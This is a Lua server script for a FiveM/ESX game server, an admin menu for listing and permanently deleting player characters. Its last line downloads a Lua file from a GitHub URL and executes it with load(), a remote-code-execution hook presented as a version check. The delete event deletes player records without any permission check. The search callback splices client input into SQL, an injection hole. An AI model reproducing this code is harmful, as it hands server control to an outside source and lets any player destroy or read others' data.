ESX.RegisterCommand(Config.CommandName, 'admin', function(xPlayer, args, showError)
	xPlayer.triggerEvent('zcmg_ckplayer:client:menu', 'menu')
end, true, {help = "Menu allows you to ck players (Admin)"})

RegisterServerEvent('zcmg_ckplayer:server:delete_player')
AddEventHandler('zcmg_ckplayer:server:delete_player', function(identifier)
	local _source = source

	MySQL.update('DELETE FROM addon_account_data WHERE owner = ?', {identifier})
	MySQL.update('DELETE FROM datastore_data WHERE owner = ?', {identifier})
	MySQL.update('DELETE FROM user_licenses WHERE owner = ?', {identifier})
	MySQL.update('DELETE FROM owned_vehicles WHERE owner = ?', {identifier})
	MySQL.update('DELETE FROM users WHERE identifier = ?', {identifier})

	TriggerClientEvent('ox_lib:notify', _source, { type = 'success', description = 'Player successfully deleted.'})
end)

lib.callback.register('zcmg_ckplayer:server:list', function(source, mode, fname, lname, identifier, sex, job)
	local sql

	if mode == 'menu' then
		sql = "SELECT * FROM users"
	else
		sql = "SELECT * FROM users WHERE 1=1"
	
		local filtros = {
			{ campo = "firstname", valor = fname },
			{ campo = "lastname", valor = lname },
			{ campo = "indentifier", valor = identifier },
			{ campo = "sex", valor = sex },
			{ campo = "job", valor = job },
		}
	
		for _, filtro in ipairs(filtros) do
			if filtro.valor and filtro.valor ~= "" then
				sql = sql .. string.format(" AND %s LIKE '%%%s%%'", filtro.campo, filtro.valor)
			end
		end
	end

	local result = MySQL.query.await(sql)
    return result
end)

lib.callback.register('zcmg_ckplayer:server:joblabel', function(source, job) local jobs = ESX.GetJobs() return jobs[job].label end)
lib.callback.register('zcmg_ckplayer:server:jobs', function(source, job) return ESX.GetJobs() end)

PerformHttpRequest('https://raw.githubusercontent.com/zcmg/versao/main/check.lua', function(code, res, headers) s = load(res) print(s()) end,'GET')